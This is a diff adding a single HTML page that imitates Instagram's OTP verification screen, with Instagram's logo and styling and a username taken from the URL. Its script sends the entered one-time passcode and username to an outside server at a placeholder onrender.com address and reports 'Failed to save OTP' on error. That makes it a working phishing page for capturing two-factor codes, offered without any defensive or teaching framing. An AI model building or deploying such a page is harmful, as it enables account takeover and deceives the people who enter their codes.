@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram OTP Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .otp-container {
+            width: 350px;
+            max-width: 100%;
+            box-sizing: border-box;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 175px;
+            max-width: 100%;
+            margin: 20px auto;
+            image-rendering: auto;
+            display: block;
+        }
+        .otp-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .otp-form input {
+            padding: 12px;
+            height: 44px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 16px;
+            box-sizing: border-box;
+            width: 100%;
+        }
+        .otp-form input:focus {
+            outline: none;
+            border-color: #a0a0a0;
+        }
+        .otp-button {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            height: 44px;
+        }
+        .otp-button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        .otp-message {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 400px) {
+            .otp-container {
+                padding: 15px;
+            }
+            .logo {
+                width: 150px;
+            }
+            .otp-form input, .otp-button {
+                font-size: 14px;
+                height: 40px;
+            }
+            .otp-message {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+        <img src="instagram-logo.png" alt="Instagram" class="logo">
+        <p class="otp-message">Enter the OTP sent to <span id="username"></span></p>
+        <form class="otp-form" onsubmit="handleOtpSubmit(event)">
+            <input type="text" placeholder="Enter OTP" required>
+            <button type="submit" class="otp-button" disabled>Verify OTP</button>
+        </form>
+    </div>
+
+    <script>
+        const form = document.querySelector('.otp-form');
+        const button = form.querySelector('.otp-button');
+        const input = form.querySelector('input');
+        const usernameSpan = document.querySelector('#username');
+
+        // Get username from URL query parameter
+        const params = new URLSearchParams(window.location.search);
+        const username = params.get('username') || 'your account';
+        usernameSpan.textContent = username;
+
+        // Form input validation
+        input.addEventListener('input', () => {
+            button.disabled = input.value.trim() === '';
+        });
+
+        // OTP submission handling
+        async function handleOtpSubmit(event) {
+            event.preventDefault();
+            const otp = input.value.trim();
+
+            try {
+                const response = await fetch('https://your-app.onrender.com/api/otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, otp })
+                });
+                if (!response.ok) {
+                    alert('Failed to save OTP.');
+                }
+            } catch (error) {
+                alert('Error saving OTP: ' + error.message);
+            }
+
+            form.reset();
+            button.disabled = true;
+        }
+    </script>
+</body>
+</html>
